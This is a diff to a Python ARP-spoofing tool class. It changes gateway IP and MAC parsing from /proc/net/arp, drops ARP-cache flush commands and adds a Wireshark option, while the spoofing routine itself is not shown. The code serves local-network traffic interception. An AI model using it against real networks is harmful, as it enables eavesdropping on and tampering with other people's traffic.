@@ -21,22 +21,18 @@ class Spoofing_arp:
            self.get_geteway()
            self.Host_info()
            self.arpSpoofing()
-           command = "ip -s -s neigh flush all"
-           subprocess.call(command,shell=True,stderr=subprocess.PIPE)  
-           command = "arp -n"
-           subprocess.call(command,shell=True,stderr=subprocess.PIPE)  
-           time.sleep(2)
+          
       def get_geteway(self):
-
            with open ('/proc/net/arp','r') as geteway :
-                router = geteway.read()
-           if self.args.Interface in router:
-              rou_split = router.split()
-              self.getaddrss = rou_split[9]
-              self.getmac = rou_split[12]
-              route_ipbytes = bytes(self.getaddrss.encode('utf-8'))
-              self.geteway_mac = binascii.unhexlify(self.getmac.replace(":",''))
-              self.RouterIpConvert = socket.inet_aton(str(route_ipbytes).replace("'","").replace('b',""))            
+                self.router= geteway.readlines()
+           for line in self.router :
+               if self.args.Interface in line :
+                  self.rou_split = str("".join(line)).replace("\n",'').split()
+           self.getaddrss = self.rou_split[0]
+           self.getmac = self.rou_split[3]
+           route_ipbytes = bytes(self.getaddrss.encode('utf-8'))
+           self.geteway_mac = binascii.unhexlify(self.getmac.replace(":",''))
+           self.RouterIpConvert = socket.inet_aton(str(route_ipbytes).replace("'","").replace('b',""))            
       def Host_info(self):
 
            command  = "ifconfig | grep 'ether'"
@@ -165,10 +161,11 @@ class Spoofing_arp:
                     exit()
       def arg_parse(self):
           parser = argparse.ArgumentParser( description="Usage: <OPtion> <arguments> ")          
-          parser.add_argument( '-I',"--Interface" )
-          parser.add_argument( '-M',"--dest"    )
-          parser.add_argument( '-T',"--Target"  )
+          parser.add_argument( '-I',"--Interface")
+          parser.add_argument( '-M',"--dest"     )  
+          parser.add_argument( '-T',"--Target"   )
           parser.add_argument( '-R',"--repate"   )
+          parser.add_argument( '-W',"--Wireshark")
           self.args = parser.parse_args()
           if len(sys.argv)> 1 :
               pass
